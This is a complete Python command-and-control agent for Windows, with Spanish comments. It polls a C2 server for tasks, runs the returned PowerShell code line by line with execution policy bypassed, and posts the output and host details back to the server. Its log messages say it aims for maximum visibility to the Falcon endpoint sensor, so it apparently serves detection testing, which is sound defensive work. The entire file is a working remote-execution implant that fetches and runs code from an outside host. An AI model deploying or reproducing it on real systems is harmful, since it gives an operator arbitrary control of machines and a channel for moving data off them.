#!/usr/bin/env python3

import os
import platform
import subprocess
import tempfile
import time
import logging
import random
import socket
import uuid
import json
import threading
import re
import urllib.request
from datetime import datetime


def setup_logging(agent_id):
    logger = logging.getLogger("PowerShellAgent")
    logger.setLevel(logging.DEBUG)
    fh = logging.FileHandler(f"agent_{agent_id}.log")
    fh.setLevel(logging.DEBUG)
    ch = logging.StreamHandler()
    ch.setLevel(logging.INFO)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    fh.setFormatter(formatter)
    ch.setFormatter(formatter)
    logger.addHandler(fh)
    logger.addHandler(ch)
    return logger


class PowerShellAgent:
    def __init__(self, c2_url):
        self.agent_id = f"AGENT-{platform.system()}-{socket.gethostname()}-{uuid.uuid4().hex[:6]}"
        self.c2_url = c2_url
        self.running = True
        self.logger = setup_logging(self.agent_id)
        self.logger.info(f"Initialized PowerShell agent {self.agent_id} for Windows")
        self.powershell_cmd = "powershell.exe"

    def check_for_tasks(self):
        """Consultar al servidor por nuevas tareas"""
        try:
            req = urllib.request.Request(f"{self.c2_url}/tasks?agent={self.agent_id}")
            with urllib.request.urlopen(req, timeout=10) as response:
                return json.loads(response.read().decode())
        except Exception as e:
            self.logger.error(f"Failed to get tasks: {e}")
            return None

    def execute_powershell_line_by_line(self, code):
        """Ejecutar código PowerShell línea por línea para máxima visibilidad en Falcon"""
        # Parsear líneas, ignorando comentarios y líneas vacías
        lines = []
        for line in code.split('\n'):
            stripped = line.strip()
            if stripped and not stripped.startswith('#'):
                lines.append(stripped)
        
        all_stdout = []
        all_stderr = []
        executed_commands = []
        
        self.logger.info(f"Executing {len(lines)} PowerShell commands line by line")
        self.logger.info("Each command will appear as separate endpoint detection in Falcon")

        for i, line in enumerate(lines, 1):
            try:
                self.logger.info(f"[COMMAND {i}] Executing: {line[:100]}...")
                
                # Ejecutar cada línea como comando individual de PowerShell
                run_cmd = [
                    self.powershell_cmd,
                    "-ExecutionPolicy", "Bypass",
                    "-NoProfile",
                    "-Command", line
                ]

                # Ejecutar comando
                result = subprocess.run(
                    run_cmd,
                    capture_output=True,
                    text=True,
                    timeout=60  # Timeout por comando individual
                )

                # Registrar comando ejecutado
                executed_commands.append({
                    "line_number": i,
                    "command": line,
                    "return_code": result.returncode,
                    "timestamp": datetime.now().isoformat()
                })

                # Capturar salida
                if result.stdout:
                    stdout_output = f"[COMMAND {i}] {result.stdout.strip()}"
                    all_stdout.append(stdout_output)
                    self.logger.debug(f"STDOUT: {result.stdout.strip()}")
                
                if result.stderr:
                    stderr_output = f"[COMMAND {i}] {result.stderr.strip()}"
                    all_stderr.append(stderr_output)
                    self.logger.debug(f"STDERR: {result.stderr.strip()}")

                # Pausa entre comandos para que Falcon pueda procesar cada uno
                time.sleep(1)  # 1 segundo entre comandos

            except subprocess.TimeoutExpired:
                error_msg = f"[COMMAND {i}] Command timed out: {line}"
                all_stderr.append(error_msg)
                self.logger.warning(f"Command {i} timed out: {line}")
                
                executed_commands.append({
                    "line_number": i,
                    "command": line,
                    "return_code": -1,
                    "error": "timeout",
                    "timestamp": datetime.now().isoformat()
                })
                
            except Exception as e:
                error_msg = f"[COMMAND {i}] Error executing: {line} - {str(e)}"
                all_stderr.append(error_msg)
                self.logger.error(f"Error executing command {i}: {e}")
                
                executed_commands.append({
                    "line_number": i,
                    "command": line,
                    "return_code": -1,
                    "error": str(e),
                    "timestamp": datetime.now().isoformat()
                })

        self.logger.info(f"Completed execution of {len(executed_commands)} PowerShell commands")

        return {
            "stdout": '\n'.join(all_stdout),
            "stderr": '\n'.join(all_stderr),
            "returncode": 0,
            "executed_as": "powershell_line_by_line_terminal",
            "total_commands": len(executed_commands),
            "executed_commands": executed_commands,
            "execution_summary": f"Executed {len(executed_commands)} individual PowerShell commands for maximum Falcon visibility"
        }

    def send_result(self, task_id, result):
        """Enviar resultados de vuelta al servidor"""
        try:
            # Añadir información adicional del agente
            enhanced_result = {
                **result,
                "agent_info": {
                    "agent_id": self.agent_id,
                    "platform": "Windows",
                    "hostname": socket.gethostname(),
                    "powershell_cmd": self.powershell_cmd,
                    "execution_method": "line_by_line_terminal",
                    "timestamp": datetime.now().isoformat()
                }
            }

            data = json.dumps({
                "agent_id": self.agent_id,
                "task_id": task_id,
                "result": enhanced_result
            }).encode()

            req = urllib.request.Request(
                f"{self.c2_url}/results",
                data=data,
                headers={"Content-Type": "application/json"}
            )
            
            with urllib.request.urlopen(req, timeout=10) as response:
                response_data = response.read().decode()
                self.logger.info(f"Result sent for task {task_id}: {response_data}")
                
        except Exception as e:
            self.logger.error(f"Failed to send result for task {task_id}: {e}")

    def run(self):
        """Bucle principal del agente"""
        self.logger.info("PowerShell Agent started on Windows")
        self.logger.info("Execution mode: Line-by-line terminal commands for maximum Falcon detection")
        self.logger.info("Polling interval: 1 second for maximum responsiveness")
        self.logger.info(f"Using PowerShell command: {self.powershell_cmd}")
        
        while self.running:
            try:
                # Consultar por nuevas tareas
                task = self.check_for_tasks()
                
                if task and task.get("status") == "task_available":
                    task_data = task["task"]
                    task_id = task_data["id"]
                    code = task_data["code"]
                    task_type = task_data.get("task_type", "unknown")
                    
                    self.logger.info(f"Executing task {task_id} (type: {task_type})")
                    self.logger.info("Script will be parsed and executed line by line")
                    self.logger.debug(f"Code preview: {code[:200]}...")
                    
                    # Ejecutar línea por línea para máxima visibilidad
                    result = self.execute_powershell_line_by_line(code)
                    
                    # Enviar resultado
                    self.send_result(task_id, result)
                    
                else:
                    self.logger.debug("No tasks available")
                
                # Polling cada segundo para máxima responsividad
                time.sleep(1)
                
            except KeyboardInterrupt:
                self.logger.info("Agent stopped by user")
                self.running = False
                break
            except Exception as e:
                self.logger.error(f"Error in main loop: {e}")
                time.sleep(5)  # Esperar menos tiempo en caso de error


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="PowerShell Agent - Line by Line Execution for Maximum Falcon Detection")
    parser.add_argument("--server", required=True, help="C2 server URL (e.g., http://192.168.1.100:5000)")
    
    args = parser.parse_args()
    
    print(f"Starting PowerShell Agent for Windows...")
    print(f"Server: {args.server}")
    print(f"Polling interval: 1 second")
    print(f"Execution mode: Line-by-line terminal commands")
    print(f"Each PowerShell command will appear as separate endpoint detection in Falcon")
    
    agent = PowerShellAgent(args.server)
    
    try:
        agent.run()
    except KeyboardInterrupt:
        print("\nAgent stopped by user")
    except Exception as e:
        print(f"Agent crashed: {e}")
        agent.logger.error(f"Agent crashed: {e}")
